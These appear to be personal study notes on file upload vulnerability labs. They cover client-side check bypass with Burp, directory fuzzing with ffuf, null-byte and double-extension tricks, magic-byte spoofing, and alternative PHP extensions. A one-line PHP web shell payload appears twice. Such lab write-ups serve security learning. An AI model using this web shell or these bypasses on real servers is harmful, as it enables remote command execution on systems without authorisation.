# Basic Bypass
The vulnerability here arises when we are able to upload files on the server and these files are not verified. So basically we can upload malicious file with malicious content.

In general we are able to gain a web shell, for example uploading a php file.

## File upload 0x01
Basically this can happen with photos, so the basic filters are done on the extension of the file:
- ![[Pasted image 20250106155345.png]]

**==If the check is done with javascript we can easily disable javascript on the browser.==**


### Burpo suite manipulation

We perform the `POST` request to upload an image.
Then we go to burp and we send this request to the repeter:
- ![[Pasted image 20250106155735.png]]

We delete the png content and we put a random text and we change the extension of the file uploaded, for example in `txt`:
- ![[Pasted image 20250106155824.png]]


**==In this case we are able to upload it, but only because the check is done on the client side and not on the server side:==**
- ![[Pasted image 20250106160057.png]]

At this point we try to upload a php file to get a web shell:
```php
<?php system($_GET['cmd']); ?>
```
- also in this case we have to change the extension to `.php`
- ![[Pasted image 20250106160350.png]]


Now we need to find where this file is:
- generally in the folder of all other images, in this case if we ispect the page we find `assets/image.png`

But in this case is not there so we need to find the folder.
We can try to fuzz it with `ffuf`:
```bash
ffuf -u URL/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
- ![[Pasted image 20250106160710.png]]

In this case we find the `labs` folder and the `uploads` folder, so we can try to navigate it.
- ![[Pasted image 20250106160806.png]]

At this ppoint we insert a command and we are done:
- ![[Pasted image 20250106160828.png]]



# Magic bytes FileUpload 0x02

In this case the checks are done on the server so we are not able to upload a php webshell changing the  content and the extensions:
- ![[Pasted image 20250106161027.png]]

So we can try the `null byte` bypass adding
```php
file.php%00.png
```
- but no results

Maybe we can try to use
```php
file.php.png
```
- if the it uses a wrong regex we are able to bypass it


In this case the filter is done on the magic bytes, so the first bytes of the content of the file.

the idea is to insert our payload in the magic bytes of a valid image:
- ![[Pasted image 20250106161619.png]]
- using the `php` extension and removing the useless content

Here we insert into the magic byte our payload:
```php
<?php system($_GET['cmd']); ?>
```

So now we are able to run commands:
- ![[Pasted image 20250106161701.png]]



Sometimes we are not able to upload a `.php` file so we can try to upload a file with a valid PHP extension:
- ![[Pasted image 20250106162007.png]]
We just need to search for valid php extensions.



# Challenge FileUpload 0x03

In this case we need to use the magic bytes and also to find a way to uplaod a valid php file since `.php` extension is not allowed.

So we search on google and we find that `.php5` is a valid extesion. So let's try it:
- ![[Pasted image 20250106162339.png]]

But we see that the server is not configured to execute php files:
- ![[Pasted image 20250106162421.png]]


So let's try with `.php4 .php3 .php2 .php1` but nothing.

If we try with `.phtml` we get it so we found a way to inject our webshell:
- ![[Pasted image 20250106162550.png]]
- ![[Pasted image 20250106162600.png]]
